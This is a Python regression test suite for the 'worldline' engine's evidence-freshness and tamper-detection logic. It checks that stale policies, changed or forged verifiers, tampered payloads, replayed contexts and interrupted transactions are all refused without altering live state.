"""JANUS II evidence-freshness regressions A–J (retained reproducers).

Every test here is deterministic and spends no model quota. Each records the native refusal
code and compares the live PRIME bytes before and after a refusal: internal records may be
appended, the protected live content must not change. Baseline counterexamples for the
1.2.x engine (where these scenarios were accepted or refused for the wrong reason) are
preserved in the worldline-lab campaign; on this engine they are ordinary regressions.
"""
from __future__ import annotations

import json
import os
import shutil
import stat
import tempfile
import threading
import time
import sys
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))

from worldline.core import Core, hash_id
from worldline.errors import ConflictError, WorldlineError
from worldline.receipt import ReceiptBuilder
from worldline.roots import RootManager
from worldline.store import StateStore
from worldline.transaction import CollapseTransaction
from worldline.validation import differences, requirement_hash

from freshness_support import (
    EXAM_CHECK, EXAM_IMPORTING, EXAM_V1, EXAM_V2, EXTRA_CHECK, HELPER_V1, P0, P0_PROTECTED, P1, SLOW_EXAM, FreshnessLab, isolated_paths, policy, synthetic_candidate, tree_bytes,
)
from validation_support import attach_fresh_context


def _unchanged(test: unittest.TestCase, lab: FreshnessLab, before: dict[str, bytes], prime_before: dict, receipts_before: int) -> None:
    test.assertEqual(lab.live(), before, "live PRIME bytes changed across a refusal")
    after = lab.prime()
    test.assertEqual((after["id"], after["instanceId"], after["generation"]), (prime_before["id"], prime_before["instanceId"], prime_before["generation"]), "PRIME identity changed across a refusal")
    test.assertEqual(len(lab.receipts()), receipts_before, "a refusal produced a receipt")


def _last_binding(lab: FreshnessLab) -> dict:
    item = lab.receipts()[-1]
    receipt = item.get("receipt", item)
    return receipt["evidenceBinding"]


class A_OutdatedPolicyWithoutConflict(unittest.TestCase):
    def test_p0_evidence_cannot_promote_under_p1_and_prime_is_untouched(self) -> None:
        lab = FreshnessLab(self)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            self.assertTrue(lab.validation("alpha")["fresh"])
            # P1 adds a requirement the candidate fails; the candidate never touched the policy
            # file, so staging is conflict-free (the merge takes P1 from PRIME).
            lab.set_policy(P1)
            prime_before = lab.settle()["prime"]
            before, receipts = lab.live(), len(lab.receipts())
            status = lab.validation("alpha")
            self.assertFalse(status["fresh"])
            self.assertTrue(any("extra" in d for d in status["differences"]), status["differences"])
            error = lab.refusal(lab.prepare, "alpha")
            self.assertEqual(error.code, "EVIDENCE_STALE")
            self.assertNotIsInstance(error, ConflictError)
            self.assertNotIn("conflicts", error.details)
            self.assertTrue(any("extra" in d for d in error.details["differences"]), error.details)
            self.assertEqual(error.details["evidenceSource"], "finalization")
            _unchanged(self, lab, before, prime_before, receipts)
            # The refusal is on the causal log, and no transaction was created.
            events = lab.client.request("log", {})["events"]
            self.assertTrue(any(e.get("kind") == "promotion-refused" and e.get("reason") == "EVIDENCE_STALE" for e in events))
            self.assertEqual(lab.client.request("transaction.list"), [])
            # Revalidation under P1 fails honestly (extra.txt is missing) and does not unlock anything.
            revalidated = lab.revalidate("alpha")
            self.assertEqual(revalidated["outcome"], "FAIL")
            self.assertEqual({r["id"]: r["status"] for r in revalidated["results"]}, {"exam": "PASS", "extra": "FAIL"})
            self.assertEqual(lab.refusal(lab.prepare, "alpha").code, "EVIDENCE_STALE")
            _unchanged(self, lab, before, prime_before, receipts)
            # A candidate that meets P1 promotes.
            self.assertEqual(lab.fork("beta", "writer_both")["state"], "VALID")
            prepared = lab.prepare("beta")
            self.assertEqual(prepared["decision"], "AUTHORIZED")
            self.assertEqual(prepared["validation"]["mode"], "collapse")
            self.assertEqual(lab.commit(prepared["transaction_id"])["state"], "COMMITTED")
            self.assertEqual((lab.work / "extra.txt").read_text(encoding="utf-8"), "extra")
        finally:
            lab.close()


class B_VerifierChangedAtTheSamePath(unittest.TestCase):
    def test_old_evidence_does_not_survive_new_verifier_bytes(self) -> None:
        lab = FreshnessLab(self)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            lab.set_exam(EXAM_V2)  # same filename, stricter bytes
            prime_before = lab.settle()["prime"]
            before, receipts = lab.live(), len(lab.receipts())
            error = lab.refusal(lab.prepare, "alpha")
            self.assertEqual(error.code, "EVIDENCE_STALE")
            self.assertTrue(any("evaluator/exam.py" in d for d in error.details["differences"]), error.details)
            _unchanged(self, lab, before, prime_before, receipts)
            # The candidate that satisfies the new verifier promotes; the one that does not stays refused.
            self.assertEqual(lab.revalidate("alpha")["outcome"], "FAIL")
            self.assertEqual(lab.fork("beta", "writer_both")["state"], "VALID")
            self.assertEqual(lab.prepare("beta")["decision"], "AUTHORIZED")
        finally:
            lab.close()


class C_CheckMeaningChanged(unittest.TestCase):
    def test_required_flag_argv_and_execution_setting_changes_invalidate(self) -> None:
        lab = FreshnessLab(self)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            baseline = lab.client.request("doctor", {})["policy"]["requirementHash"]
            # required flag
            lab.set_policy(policy({**EXAM_CHECK, "required": False}))
            lab.settle()
            self.assertNotEqual(lab.client.request("doctor", {})["policy"]["requirementHash"], baseline)
            self.assertEqual(lab.refusal(lab.prepare, "alpha").code, "EVIDENCE_STALE")
            # argv
            lab.set_policy(policy({**EXAM_CHECK, "argv": ["/usr/bin/python3", "evaluator/exam.py", "--strict"]}))
            lab.settle()
            self.assertEqual(lab.refusal(lab.prepare, "alpha").code, "EVIDENCE_STALE")
            # back to P0: fresh again (identity is semantic, not "was it ever edited")
            lab.set_policy(P0)
            lab.settle()
            self.assertEqual(lab.client.request("doctor", {})["policy"]["requirementHash"], baseline)
            self.assertTrue(lab.validation("alpha")["fresh"])
            # execution setting: the network policy is read at daemon start
            lab.restart(network={"policy": "none", "allow": []})
            self.assertNotEqual(lab.client.request("doctor", {})["policy"]["requirementHash"], baseline)
            error = lab.refusal(lab.prepare, "alpha")
            self.assertEqual(error.code, "EVIDENCE_STALE")
            self.assertTrue(any("execution" in d for d in error.details["differences"]), error.details)
            # Revalidation under the new execution setting produces fresh evidence and unlocks promotion.
            self.assertEqual(lab.revalidate("alpha")["outcome"], "PASS")
            status = lab.validation("alpha")
            self.assertTrue(status["fresh"])
            self.assertTrue(status["effective"]["source"].startswith("revalidation:"))
            prepared = lab.prepare("alpha")
            self.assertEqual(prepared["decision"], "AUTHORIZED")
            self.assertTrue(prepared["validation"]["source"].startswith("revalidation:"))
        finally:
            lab.close()

    def test_equivalent_policy_ordering_and_formatting_keep_one_identity(self) -> None:
        lab = FreshnessLab(self, policy_value=P1)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha", "writer_both")["state"], "VALID")
            baseline = lab.client.request("doctor", {})["policy"]["requirementHash"]
            reordered = {"services": [], "checks": [EXTRA_CHECK, {k: EXAM_CHECK[k] for k in reversed(list(EXAM_CHECK))}], "generated": [], "schemaVersion": 1}
            lab.set_policy(json.dumps(reordered, indent=4, sort_keys=False) + "\n\n")
            lab.settle()
            self.assertEqual(lab.client.request("doctor", {})["policy"]["requirementHash"], baseline)
            self.assertTrue(lab.validation("alpha")["fresh"])
            prepared = lab.prepare("alpha")
            self.assertEqual(prepared["decision"], "AUTHORIZED")
            self.assertEqual(prepared["validation"]["mode"], "collapse")
        finally:
            lab.close()

    def test_requirement_hash_is_canonical_at_unit_level(self) -> None:
        a = {"schemaVersion": 1, "policy": {"canonical": {"checks": [{"id": "x", "required": True}]}, "sourceSha256": "aa", "requiredChecks": ["x"]}, "verifiers": [], "execution": {"e": 1}}
        b = {"execution": {"e": 1}, "verifiers": [], "policy": {"requiredChecks": ["x"], "sourceSha256": "bb", "canonical": {"checks": [{"id": "x", "required": True}]}}, "schemaVersion": 1}
        self.assertEqual(requirement_hash(a), requirement_hash(b))
        c = {**a, "policy": {**a["policy"], "canonical": {"checks": [{"id": "x", "required": False}]}, "requiredChecks": []}}
        self.assertNotEqual(requirement_hash(a), requirement_hash(c))
        self.assertTrue(any("required" in d for d in differences({**a, "requirementHash": requirement_hash(a)}, {**c, "requirementHash": requirement_hash(c)})))


class D_ChangeAfterPreparation(unittest.TestCase):
    def test_policy_and_verifier_changes_after_prepare_cannot_commit(self) -> None:
        lab = FreshnessLab(self)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            for label, change in (("policy", lambda: lab.set_policy(P1)), ("evaluator", lambda: lab.set_exam(EXAM_V2))):
                lab.set_policy(P0); lab.set_exam(EXAM_V1); lab.settle()
                prepared = lab.prepare("alpha")
                self.assertEqual(prepared["decision"], "AUTHORIZED", label)
                change()
                prime_before = lab.settle()["prime"]
                before, receipts = lab.live(), len(lab.receipts())
                error = lab.refusal(lab.commit, prepared["transaction_id"])
                # PRIME's own bytes moved (the policy/verifier live in the root), so the earlier
                # boundary check fires first; either way the stale authorization cannot commit.
                self.assertIn(error.code, {"PRIME_CHANGED_AFTER_PREPARE", "EVIDENCE_STALE"}, label)
                self.assertEqual(lab.transaction(prepared["transaction_id"])["state"], "DENIED", label)
                _unchanged(self, lab, before, prime_before, receipts)
                self.assertEqual(lab.refusal(lab.commit, prepared["transaction_id"]).code, "TRANSACTION_DENIED")
        finally:
            lab.close()

    def test_candidate_payload_tampered_after_prepare_cannot_commit(self) -> None:
        lab = FreshnessLab(self)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            prepared = lab.prepare("alpha")
            self.assertEqual(prepared["decision"], "AUTHORIZED")
            payload = Path(lab.client.request("show", {"world": "alpha"})["payload_path"])
            target = next(p for p in payload.rglob("candidate.txt"))
            os.chmod(target.parent, stat.S_IMODE(target.parent.stat().st_mode) | 0o200)
            os.chmod(target, stat.S_IMODE(target.stat().st_mode) | 0o200)
            target.write_text("tampered", encoding="utf-8")
            prime_before = lab.prime()
            before, receipts = lab.live(), len(lab.receipts())
            # A naive tamper breaks the payload's declared manifest: caught as an integrity failure.
            error = lab.refusal(lab.commit, prepared["transaction_id"])
            self.assertEqual(error.code, "PAYLOAD_INTEGRITY_FAILED")
            _unchanged(self, lab, before, prime_before, receipts)
            # A manifest-consistent substitution (bytes AND declared manifest rewritten) passes
            # integrity but is not what was prepared: refused by the prepare-time identity.
            from worldline.manifest import Manifest
            root = lab.client.request("root.list")[0]
            root_dir = payload / root["rootKey"]
            manifest_path = payload / "manifests" / f"{root['rootKey']}.json"
            os.chmod(manifest_path.parent, stat.S_IMODE(manifest_path.parent.stat().st_mode) | 0o200)
            os.chmod(manifest_path, stat.S_IMODE(manifest_path.stat().st_mode) | 0o200)
            Manifest.capture(root_dir, logical_root=os.fsencode(root["path"]), root_key=root["rootKey"], kind=root["kind"], core=Core.shared()).save(manifest_path)
            error = lab.refusal(lab.commit, prepared["transaction_id"])
            self.assertEqual(error.code, "CANDIDATE_CHANGED_AFTER_PREPARE")
            self.assertEqual(lab.transaction(prepared["transaction_id"])["state"], "DENIED")
            _unchanged(self, lab, before, prime_before, receipts)
        finally:
            lab.close()

    def test_requirement_change_without_prime_change_is_a_kernel_context_mismatch(self) -> None:
        # An engine/configuration change between prepare and commit that does not move PRIME's
        # bytes: only the validation-context pair catches it, and the kernel decides.
        with tempfile.TemporaryDirectory(prefix="worldline-freshness-d-") as temporary:
            paths, _env = isolated_paths(Path(temporary))
            core = Core.shared()
            store = StateStore(paths, core)
            work = Path(temporary) / "work"; work.mkdir()
            (work / "state.txt").write_text("prime", encoding="utf-8")
            RootManager(paths, store, core=core, toolchains=()).register([work], confirmed=True)
            transaction = CollapseTransaction(paths, store, core=core)
            candidate = synthetic_candidate(paths, store, core, "cand", {"state.txt": "candidate"})
            attach_fresh_context(store, candidate, core=core)
            prepared = transaction.prepare(candidate.alias)
            self.assertEqual(prepared.decision, "AUTHORIZED")
            self.assertEqual(prepared.tested_root, prepared.staged_content_root)
            before = tree_bytes(work)
            import worldline.transaction as module
            real = module.current_requirements
            def changed(store_, config_, core_=None):
                value = real(store_, config_, core_)
                return {**value, "requirementHash": hash_id(core.hash_bytes(b"a different requirement")), "execution": {**value["execution"], "engineVersion": "9.9.9"}}
            with mock.patch.object(module, "current_requirements", changed):
                with self.assertRaises(WorldlineError) as raised:
                    transaction.commit(prepared.transaction_id)
            self.assertEqual(raised.exception.code, "EVIDENCE_STALE")
            self.assertEqual(raised.exception.details["decision"], "VALIDATION_CONTEXT_MISMATCH")
            self.assertEqual(store.transaction_record(prepared.transaction_id)["state"], "DENIED")
            self.assertEqual(tree_bytes(work), before)
            store.close()


class E_ReplayAndSubstitution(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory(prefix="worldline-freshness-e-")
        root = Path(self.temporary.name)
        self.paths, _env = isolated_paths(root)
        self.core = Core.shared()
        self.store = StateStore(self.paths, self.core)
        self.work = root / "work"; self.work.mkdir()
        (self.work / "state.txt").write_text("prime", encoding="utf-8")
        RootManager(self.paths, self.store, core=self.core, toolchains=()).register([self.work], confirmed=True)
        self.transaction = CollapseTransaction(self.paths, self.store, core=self.core)

    def tearDown(self) -> None:
        self.store.close()
        self.temporary.cleanup()

    def _refused(self, world, code: str) -> WorldlineError:
        before = tree_bytes(self.work)
        with self.assertRaises(WorldlineError) as raised:
            self.transaction.prepare(world.alias)
        self.assertEqual(raised.exception.code, code)
        self.assertEqual(tree_bytes(self.work), before)
        self.assertEqual(self.transaction.listing(), [])
        return raised.exception

    def test_missing_corrupted_and_foreign_contexts_are_refused(self) -> None:
        alpha = synthetic_candidate(self.paths, self.store, self.core, "alpha", {"state.txt": "a"})
        beta = synthetic_candidate(self.paths, self.store, self.core, "beta", {"state.txt": "b"})
        # missing (legacy 1.2 world)
        self._refused(beta, "EVIDENCE_CONTEXT_MISSING")
        # substitution: alpha's context on beta
        alpha_context = attach_fresh_context(self.store, alpha, core=self.core)
        beta.evidence = {"validationContext": dict(alpha_context)}
        self.store.save_world(beta)
        self.assertEqual(self._refused(beta, "EVIDENCE_CONTEXT_INVALID").details["boundTo"], alpha.instance_id)
        # corrupted: a re-bound copy whose hash no longer matches
        forged = {**alpha_context, "candidate": {**alpha_context["candidate"], "instanceId": beta.instance_id}}
        beta.evidence = {"validationContext": forged}
        self.store.save_world(beta)
        self._refused(beta, "EVIDENCE_CONTEXT_INVALID")
        # unsupported schema
        beta.evidence = {"validationContext": {**alpha_context, "schemaVersion": 99}}
        self.store.save_world(beta)
        self._refused(beta, "EVIDENCE_CONTEXT_INVALID")
        # a requirement half whose own hash was edited
        tampered = json.loads(json.dumps(alpha_context))
        tampered["requirement"]["policy"]["requiredChecks"] = ["forged"]
        beta.evidence = {"validationContext": tampered}
        self.store.save_world(beta)
        self._refused(beta, "EVIDENCE_CONTEXT_INVALID")
        # the intact one still works
        self.assertEqual(self.transaction.prepare(alpha.alias).decision, "AUTHORIZED")

    def test_revalidation_entries_bound_to_other_content_or_failed_are_ignored(self) -> None:
        alpha = synthetic_candidate(self.paths, self.store, self.core, "alpha", {"state.txt": "a"})
        context = attach_fresh_context(self.store, alpha, core=self.core)
        self.store.set_meta(f"validation:{alpha.instance_id}", [
            {"validationId": "x", "outcome": "PASS", "worldContentId": "not-this-content", "context": {"schemaVersion": 1, "requirementHash": "0" * 64}},
            {"validationId": "y", "outcome": "FAIL", "worldContentId": alpha.content_id, "context": {"schemaVersion": 1, "requirementHash": "0" * 64}},
        ])
        prepared = self.transaction.prepare(alpha.alias)
        self.assertEqual(prepared.decision, "AUTHORIZED")
        self.assertEqual(prepared.validation["source"], "finalization")
        self.assertEqual(prepared.validation["contextHash"], context["contextHash"])

    def test_legacy_prepared_record_cannot_commit(self) -> None:
        alpha = synthetic_candidate(self.paths, self.store, self.core, "alpha", {"state.txt": "a"})
        attach_fresh_context(self.store, alpha, core=self.core)
        prepared = self.transaction.prepare(alpha.alias)
        path = Path(self.store.transaction_record(prepared.transaction_id)["prepared_path"])
        record = json.loads(path.read_text(encoding="utf-8"))
        for key in ("validation", "testedRoot", "stagedContentRoot", "untestedPaths", "stagedValidation"):
            record.pop(key, None)
        path.write_text(json.dumps(record), encoding="utf-8")
        before = tree_bytes(self.work)
        with self.assertRaises(WorldlineError) as raised:
            self.transaction.commit(prepared.transaction_id)
        self.assertEqual(raised.exception.code, "TRANSACTION_RECORD_LEGACY")
        self.assertEqual(self.store.transaction_record(prepared.transaction_id)["state"], "DENIED")
        self.assertEqual(tree_bytes(self.work), before)

    def test_receipts_without_evidence_binding_remain_valid(self) -> None:
        alpha = synthetic_candidate(self.paths, self.store, self.core, "alpha", {"state.txt": "a"})
        attach_fresh_context(self.store, alpha, core=self.core)
        prepared = self.transaction.prepare(alpha.alias)
        builder = ReceiptBuilder(self.store, self.core)
        receipt = builder.build(transaction_id=prepared.transaction_id, parent_world="p", candidate_world="c", before_root="b", after_root="a", delta={"deltaHash": "d", "summary": {}, "operations": []}, contamination=[])
        self.assertIsNone(receipt["evidenceBinding"])
        legacy = {k: v for k, v in receipt.items() if k != "evidenceBinding"}
        self.store.append_receipt(legacy)
        self.assertEqual(len(self.store.receipts()), 1)


class F_UntestedMergedResult(unittest.TestCase):
    def test_staged_bytes_that_fail_current_checks_are_refused_untested(self) -> None:
        lab = FreshnessLab(self, files={"shared.txt": "v1\n"})
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            # PRIME moves in a path the candidate never touched: conflict-free merge, but the
            # staged result (shared=v2 + candidate.txt) is not what the exam passed on.
            lab.write("shared.txt", "v2\n")
            prime_before = lab.settle()["prime"]
            before, receipts = lab.live(), len(lab.receipts())
            self.assertTrue(lab.validation("alpha")["fresh"])  # requirements unchanged: this is not staleness
            error = lab.refusal(lab.prepare, "alpha")
            self.assertEqual(error.code, "CONFLICT")
            self.assertEqual(error.details["decision"], "STAGED_UNTESTED")
            self.assertEqual(error.details["conflicts"], [])
            self.assertTrue(any(p.endswith(":shared.txt") for p in error.details["untestedPaths"]), error.details)
            self.assertEqual(error.details["stagedValidation"]["outcome"], "FAIL")
            self.assertEqual({r["id"]: r["status"] for r in error.details["stagedValidation"]["results"]}, {"exam": "FAIL"})
            _unchanged(self, lab, before, prime_before, receipts)
            record = lab.transaction(error.details["transactionId"])
            self.assertEqual((record["state"], record["decision"]), ("DENIED", "STAGED_UNTESTED"))
        finally:
            lab.close()

    def test_staged_bytes_that_pass_current_checks_are_authorized_with_staged_evidence(self) -> None:
        lab = FreshnessLab(self, files={"notes.txt": "n1\n"})
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            lab.write("notes.txt", "n2\n")
            lab.settle()
            prepared = lab.prepare("alpha")
            self.assertEqual(prepared["decision"], "AUTHORIZED")
            self.assertNotEqual(prepared["untested_paths"], [])
            self.assertEqual(prepared["staged_validation"]["outcome"], "PASS")
            self.assertEqual(prepared["tested_root"], prepared["staged_content_root"])
            committed = lab.commit(prepared["transaction_id"])
            self.assertEqual(committed["state"], "COMMITTED")
            binding = _last_binding(lab)
            self.assertEqual(binding["stagedValidation"]["outcome"], "PASS")
            self.assertEqual(binding["testedRoot"], binding["stagedContentRoot"])
            self.assertEqual(binding["prepareRequirementHash"], binding["commitRequirementHash"])
            self.assertEqual((lab.work / "notes.txt").read_text(encoding="utf-8"), "n2\n")
            self.assertEqual((lab.work / "candidate.txt").read_text(encoding="utf-8"), "candidate")
        finally:
            lab.close()

    def test_without_a_validator_untested_staged_bytes_are_simply_refused(self) -> None:
        with tempfile.TemporaryDirectory(prefix="worldline-freshness-f-") as temporary:
            paths, _env = isolated_paths(Path(temporary))
            core = Core.shared()
            store = StateStore(paths, core)
            work = Path(temporary) / "work"; work.mkdir()
            (work / "state.txt").write_text("prime", encoding="utf-8")
            (work / "other.txt").write_text("one", encoding="utf-8")
            RootManager(paths, store, core=core, toolchains=()).register([work], confirmed=True)
            transaction = CollapseTransaction(paths, store, core=core)
            candidate = synthetic_candidate(paths, store, core, "cand", {"state.txt": "candidate"})
            attach_fresh_context(store, candidate, core=core)
            (work / "other.txt").write_text("two", encoding="utf-8")  # PRIME moves, no conflict
            before = tree_bytes(work)
            with self.assertRaises(ConflictError) as raised:
                transaction.prepare(candidate.alias)
            self.assertEqual(raised.exception.details["decision"], "STAGED_UNTESTED")
            self.assertEqual(raised.exception.details["conflicts"], [])
            self.assertTrue(any(p.endswith(":other.txt") for p in raised.exception.details["untestedPaths"]))
            self.assertIsNone(raised.exception.details["stagedValidation"])
            self.assertEqual(tree_bytes(work), before)
            store.close()


class G_ReturnAndReapplication(unittest.TestCase):
    def test_checkpoint_return_reapplication_and_tamper(self) -> None:
        lab = FreshnessLab(self)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            pre_collapse = lab.prime()["instanceId"]
            prepared = lab.prepare("alpha")
            self.assertEqual(lab.commit(prepared["transaction_id"])["state"], "COMMITTED")
            self.assertEqual((lab.work / "candidate.txt").read_text(encoding="utf-8"), "candidate")
            # Checkpoint return is restoration of a previous reality: no candidate evidence
            # applies, the current requirement is recorded, and it is allowed under a new policy
            # (the operator's policy edit is itself a checkpoint, so the return names the
            # pre-collapse PRIME explicitly).
            lab.set_policy(P1)
            lab.settle()
            returned = lab.return_prepare(pre_collapse)
            self.assertEqual(returned["decision"], "AUTHORIZED")
            self.assertEqual(returned["validation"]["mode"], "checkpoint-return")
            self.assertEqual(lab.commit(returned["transaction_id"])["state"], "COMMITTED")
            self.assertFalse((lab.work / "candidate.txt").exists())
            self.assertEqual(json.loads((lab.work / ".worldline.json").read_text(encoding="utf-8")), P0)
            self.assertEqual(_last_binding(lab)["mode"], "checkpoint-return")
            # Re-application of the collapsed candidate under a policy its evidence never met: refused.
            lab.set_policy(P1)
            prime_before = lab.settle()["prime"]
            before, receipts = lab.live(), len(lab.receipts())
            error = lab.refusal(lab.return_prepare, "alpha")
            self.assertEqual(error.code, "EVIDENCE_STALE")
            _unchanged(self, lab, before, prime_before, receipts)
            # Under the policy it was evaluated against, re-application is an ordinary promotion.
            lab.set_policy(P0)
            lab.settle()
            reapplied = lab.return_prepare("alpha")
            self.assertEqual(reapplied["decision"], "AUTHORIZED")
            self.assertEqual(reapplied["validation"]["mode"], "re-application")
            self.assertEqual(lab.commit(reapplied["transaction_id"])["state"], "COMMITTED")
            self.assertEqual((lab.work / "candidate.txt").read_text(encoding="utf-8"), "candidate")
            # Byte tamper of a return point's stored payload: refused, nothing exchanged.
            payload = Path(lab.client.request("show", {"world": pre_collapse})["payload_path"])
            victim = next(p for p in payload.rglob("prime.txt"))
            os.chmod(victim.parent, stat.S_IMODE(victim.parent.stat().st_mode) | 0o200)
            os.chmod(victim, stat.S_IMODE(victim.stat().st_mode) | 0o200)
            victim.write_text("tampered\n", encoding="utf-8")
            prime_before = lab.prime()
            before, receipts = lab.live(), len(lab.receipts())
            error = lab.refusal(lab.return_prepare, pre_collapse)
            self.assertIn(error.code, {"PAYLOAD_INTEGRITY_FAILED", "BASE_ROOT_MISMATCH", "RETURN_POINT_MISMATCH", "INVALID_RETURN_POINT", "CONFLICT"})
            _unchanged(self, lab, before, prime_before, receipts)
        finally:
            lab.close()


class H_ProtectedEvaluator(unittest.TestCase):
    def test_forged_verifier_is_caught_by_protected_paths_and_by_freshness(self) -> None:
        lab = FreshnessLab(self, policy_value=P0_PROTECTED)
        try:
            lab.init()
            forged = lab.fork("forger", "forger")
            self.assertEqual(forged["state"], "DEGRADED")
            checks = {c["id"]: c["status"] for c in lab.client.request("show", {"world": "forger"})["evidence"]["checks"]}
            self.assertEqual(checks.get("protected-paths"), "FAIL")
            self.assertEqual(lab.refusal(lab.prepare, "forger").code, "INVALID_CANDIDATE")
        finally:
            lab.close()

    def test_forged_and_redirected_verifiers_without_protection_are_refused_at_prepare(self) -> None:
        lab = FreshnessLab(self, policy_value=P0)
        try:
            lab.init()
            for name in ("forger", "redirector"):
                world = lab.fork(name, name)
                # Inside the world the substitute exam "passed": the world is VALID.
                self.assertEqual(world["state"], "VALID", name)
                status = lab.validation(name)
                self.assertFalse(status["fresh"], name)
                self.assertTrue(any("evaluator/exam.py" in v for v in status["effective"]["verifiersModifiedByCandidate"]), (name, status))
                prime_before = lab.prime()
                before, receipts = lab.live(), len(lab.receipts())
                error = lab.refusal(lab.prepare, name)
                self.assertEqual(error.code, "VERIFIER_MODIFIED_BY_CANDIDATE", name)
                _unchanged(self, lab, before, prime_before, receipts)
                # Revalidation runs PRIME's exam over the candidate's tree: the substitute is
                # what is there, so it is named again and the outcome is FAIL.
                revalidated = lab.revalidate(name)
                self.assertEqual(revalidated["outcome"], "FAIL", name)
                self.assertIn("verifiers-modified", revalidated["failed"])
                self.assertEqual(lab.refusal(lab.prepare, name).code, "VERIFIER_MODIFIED_BY_CANDIDATE", name)
            self.assertEqual((lab.work / "evaluator" / "exam.py").read_text(encoding="utf-8"), EXAM_V1)
        finally:
            lab.close()

    def test_policy_edited_inside_the_world_is_ignored(self) -> None:
        lab = FreshnessLab(self, policy_value=P0)
        try:
            lab.init()
            world = lab.fork("editor", "policy_editor")
            self.assertEqual(world["state"], "DEGRADED")
            checks = {c["id"]: c["status"] for c in lab.client.request("show", {"world": "editor"})["evidence"]["checks"]}
            self.assertEqual(checks.get("exam"), "FAIL")  # PRIME's checks ran, not the world's rewritten policy
            self.assertEqual(lab.refusal(lab.prepare, "editor").code, "INVALID_CANDIDATE")
        finally:
            lab.close()


class I_InterruptionAndRestart(unittest.TestCase):
    def test_prepare_then_sigkill_then_policy_change_then_restart(self) -> None:
        lab = FreshnessLab(self)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            prepared = lab.prepare("alpha")
            self.assertEqual(prepared["decision"], "AUTHORIZED")
            before = lab.live()
            lab.kill9()
            lab.set_policy(P1)
            lab.start()
            self.assertEqual(lab.live() | {}, {**before, ".worldline.json": json.dumps(P1).encode()})
            listed = lab.client.request("transaction.list")
            self.assertEqual([(t["transactionId"], t["state"], (t["error"] or {}).get("code")) for t in listed], [(prepared["transaction_id"], "ABORTED", "RECOVERED_BEFORE_COMMIT")])
            doctor = lab.client.request("doctor", {})
            self.assertEqual(doctor["recovery"]["state"], "OK")
            self.assertEqual(doctor["openTransactions"], [])
            self.assertEqual(lab.refusal(lab.commit, prepared["transaction_id"]).code, "INVALID_TRANSACTION_STATE")
            self.assertEqual(lab.refusal(lab.prepare, "alpha").code, "EVIDENCE_STALE")
            self.assertFalse((lab.work / "candidate.txt").exists())
        finally:
            lab.close()

    def test_sigkill_during_staged_validation_leaves_no_half_transaction(self) -> None:
        lab = FreshnessLab(self, exam=SLOW_EXAM, files={"notes.txt": "n1\n"})
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            lab.write("notes.txt", "n2\n")
            lab.settle()
            outcome: dict = {}
            def run() -> None:
                try:
                    outcome["result"] = lab.prepare("alpha")
                except WorldlineError as exc:
                    outcome["error"] = exc.code
            worker = threading.Thread(target=run); worker.start()
            time.sleep(1.5)  # inside the slow exam (4 s) run by the staged validation
            lab.kill9()
            worker.join(timeout=30)
            self.assertIn(outcome.get("error"), {"DAEMON_DISCONNECTED", "DAEMON_UNAVAILABLE", None})
            self.assertNotIn("result", outcome)
            lab.start()
            listed = lab.client.request("transaction.list")
            self.assertTrue(all(t["state"] in {"ABORTED", "DENIED"} for t in listed), listed)
            doctor = lab.client.request("doctor", {})
            self.assertEqual(doctor["recovery"]["state"], "OK")
            self.assertEqual(doctor["openTransactions"], [])
            self.assertFalse((lab.work / "candidate.txt").exists())
            self.assertEqual((lab.work / "notes.txt").read_text(encoding="utf-8"), "n2\n")
            self.assertEqual(lab.validation("alpha")["revalidations"], [])
            prepared = lab.prepare("alpha")
            self.assertEqual(prepared["decision"], "AUTHORIZED")
            self.assertEqual(prepared["staged_validation"]["outcome"], "PASS")
        finally:
            lab.close()


class J_LegacyCompatibility(unittest.TestCase):
    def test_legacy_world_without_context_is_refused_then_revalidated(self) -> None:
        lab = FreshnessLab(self)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            # Simulate a world finalized by 1.2.x: same bytes, evidence without a validation context.
            self.assertEqual(lab.stop(), 0, lab.log.read_text(encoding="utf-8", errors="replace"))
            store = lab.open_store()
            world = store.world("alpha")
            self.assertIn("validationContext", world.evidence)
            world.evidence = {k: v for k, v in world.evidence.items() if k != "validationContext"}
            store.save_world(world)
            store.close()
            lab.start()
            status = lab.validation("alpha")
            self.assertFalse(status["fresh"])
            self.assertIsNone(status["effective"])
            self.assertEqual(status["problems"], ["EVIDENCE_CONTEXT_MISSING"])
            prime_before = lab.prime()
            before, receipts = lab.live(), len(lab.receipts())
            self.assertEqual(lab.refusal(lab.prepare, "alpha").code, "EVIDENCE_CONTEXT_MISSING")
            _unchanged(self, lab, before, prime_before, receipts)
            # The documented path: revalidate against the current PRIME.
            revalidated = lab.revalidate("alpha")
            self.assertEqual(revalidated["outcome"], "PASS")
            status = lab.validation("alpha")
            self.assertTrue(status["fresh"])
            self.assertEqual(status["effective"]["source"], f"revalidation:{revalidated['validationId']}")
            self.assertEqual([e["outcome"] for e in status["revalidations"]], ["PASS"])
            prepared = lab.prepare("alpha")
            self.assertEqual(prepared["decision"], "AUTHORIZED")
            self.assertEqual(prepared["validation"]["source"], f"revalidation:{revalidated['validationId']}")
            self.assertEqual(lab.commit(prepared["transaction_id"])["state"], "COMMITTED")
            self.assertEqual(_last_binding(lab)["evidenceSource"], f"revalidation:{revalidated['validationId']}")
            self.assertEqual(lab.client.request("log", {"verify": True})["verification"]["receipts"], 1)
            # CLI surfaces
            shown = lab.cli("validation", "alpha", "--json")
            self.assertEqual(shown.returncode, 0, shown.stderr)
            self.assertTrue(json.loads(shown.stdout)["fresh"])
        finally:
            lab.close()

    def test_retained_history_survives_and_old_records_stay_readable(self) -> None:
        lab = FreshnessLab(self)
        try:
            lab.init()
